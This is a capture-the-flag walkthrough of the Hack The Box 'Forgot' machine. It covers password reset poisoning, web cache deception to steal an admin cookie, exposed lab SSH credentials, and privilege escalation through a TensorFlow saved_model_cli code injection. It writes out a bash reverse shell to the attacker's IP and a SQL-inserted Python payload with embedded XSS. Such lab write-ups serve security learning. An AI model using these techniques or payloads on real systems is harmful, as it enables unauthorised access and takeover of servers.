# :game_die: Forgot Hack The box Walkthrough - [HTB]

> **Original Source:** [Forgot Hack The box Walkthrough - [HTB]](https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Forgot Hack The box Walkthrough — [HTB]


Hey, Guys Welcome to My Blog So Today We are going to discuss about Forgot Hack the box machine

>

And Before going to the writeup if you like this please follow up my profile and give applause to this article because it literally motivate me post more writeup


## UserFlag:


This machine comes up with a host header injection in that we want to exploit the Password reset functionality to get access to the dashboard and using the Web cache deception you will get the Cookie of that admin and finally, you get the user shell of that machine

## RootFlag:


In this Root flag, we want to abuse the sudo binary to get the root shell of that machine


So Let's Get Started


Before Going to this machine Some people might get this Type of Error


If getting this Change your VPN or reset the machine in hack the box

## Enumeration:


So Now we get the machine first As usual we start with Our Nmap scan

>

STEP 1: nmap -sC -sV 10.10.11.188


*Report 1*


*Report 2*


By analyzing these two reports you get the usual ports like SSH,HTTP, etc. And the server is Werkzeug/2.1.2 Python/3.8.10, Cache server is varnish/6.2 interesting…


Next, we look up that webpage [http://10.10.11.188](http://10.10.11.188)


After that, I enumerate the directory using feroxbuster

>

STEP 2: feroxbuster -u [http://10.10.11.188/](http://10.10.11.188/) -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt


Here you get something interesting…


Next, I found the username of that website in the source code

>

Note: I think it is random username please check source code by your own don’t copy and paste from my blog


Username: robert-dev-14522


Here we have the username but we don't the password so lets us click the forgot password because the machine makes sense here 😂😂

## Password reset poisoning:


After further analyzing google I found an interesting article on poisoning the password reset functionality


Using the above article I poisoned the password reset functionality


First captured that request using Burp and next replace that IP with your local machine


Before that, start your listener on your local machine in port 80


Now send the request


And Wait a few minutes you get the reset link in your listener


Next copy that reset link and open it with your browser


Booooom!!! Now the password will be get reset and log in with that username and your new password


Now you get logged in as Robert


Further analyzing this I found some tickets in that portal


In that last ticket, you can able to notice that it SSH credentials and that is escalated which means resolved


So if we get the cookie of that admin you get the admin access and we can also get the SSH creds

## Web Cache Deception:


Further analyzing this website I have found that It uses an old varnish cache server which is (Varnish/6.2) and I found something wired on the Age header it remains zero


I Capture that request using burp and you can able to see that the age header remains 0, next change that link to the extension .CSS then the age header shows the number 18 which means it caches the web page if we send that page to admin we can able to take over the session


## Get Vicky’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


( check out this below article )


[https://medium.com/free-code-camp/cache-deception-how-i-discovered-a-vulnerability-in-medium-and-helped-them-fix-it-31cec2a3938b](https://medium.com/free-code-camp/cache-deception-how-i-discovered-a-vulnerability-in-medium-and-helped-them-fix-it-31cec2a3938b)


It is amazing research presented by omergil in BlackHat if have any interest check out his presentation [http://omergil.blogspot.com/](http://omergil.blogspot.com/)


First, go to escalate directory. Now you get some Escalation Form to report admin


Enter the malicious Link: [http://10.10.11.188/static/evilox.css](http://10.10.11.188/static/evilox.css)


Send this request ( I was sent this via Burp )


Next, wait for a few minutes and curl that URL

>

STEP 3: curl -I [http://10.10.11.188/static/evilox.css](http://10.10.11.188/static/evilox.css)


Now you will get the Cookie in Set-Cookie


Next, Replace the cookie in the storage tab


And open the [http://10.10.11.188/admin_tickets](http://10.10.11.188/admin_tickets) boom!!! Now you will get the SSH Creds


Username:diego Password: dCb#1!x0%gjq

>

STEP 4: ssh diego@10.10.11.188


## Getting User shell:


Boommmm!!! Now you will get userflag of that machine


## Privilege Escalation:


>

STEP 5: sudo -l


## RCE:


Further analyzing this I found that the script checks for reason from escalate table in the database XSS and there is MySQL Connector also


And the TensorFlow (2.6.3 )saved_model_cli which is vulnerable to code injection


So first create a reverse shell script on the tmp directory

>

STEP 6: bash -i >& /dev/tcp/10.10.14.30/5050 0>&1


Next, give the executable permission and start your listener on your local machine

>

STEP 7: chmod 777 evilox.sh


STEP 8: nc -lvp 5050


Next, open the MySQL database on that machine


And change the database to an app


Next enter the below payload on that database


```

insert into escalate values ("evil","evil","evil",'hello=exec("""\nimport os\nos.system("/tmp/evilox.sh")\nprint("&ErrMsg=%3Cimg%20src=%22http://imgur.com/EVILOX.png%22%20/%3E%3CSCRIPT%3Ealert%28%22xss%22%29%3C/SCRIPT%3E")""")');
```


After that run that python script with sudo permission


Booommm!!!! Now go to the listener you will get the reverse shell


Now you can able to get the root flag of that machine

>

STEP 9: cat root.txt


I hope you will understand this article if you like this please donate to my OSCP ExamFollow Us:[https://linktr.ee/Vicky_Pentester](https://linktr.ee/Vicky_Pentester)

---

*Originally published on [Medium](https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
